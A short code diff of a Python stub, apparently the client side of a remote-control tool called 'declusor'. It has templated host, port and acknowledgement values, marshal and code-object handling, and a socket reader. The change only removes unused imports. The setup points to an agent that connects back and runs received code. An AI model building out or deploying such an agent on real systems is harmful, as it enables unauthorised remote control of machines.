@@ -2,14 +2,10 @@ import importlib.util
 import io
 import json
 import marshal
-import os
 import platform
 import socket
 import struct
-import subprocess
 import sys
-import tempfile
-from contextlib import suppress
 
 HOST, PORT, ACK = ("$DECLUSOR_HOST", int("$DECLUSOR_PORT"), bytes.fromhex("$DECLUSOR_ACK"))
 CH_EXIT = int("$DECLUSOR_CH_EXIT")
@@ -22,6 +18,7 @@ MAX_TLV_FRAME_SIZE = int("$DECLUSOR_MAX_TLV_FRAME_SIZE")
 SESSION_SCOPE: dict[str, object] = {"__name__": "__declusor__"}
 
 CodeType = type((lambda: None).__code__)
+
 
 def _read_exact(sock: socket.socket, length: int) -> bytes | None:
     buf = bytearray()
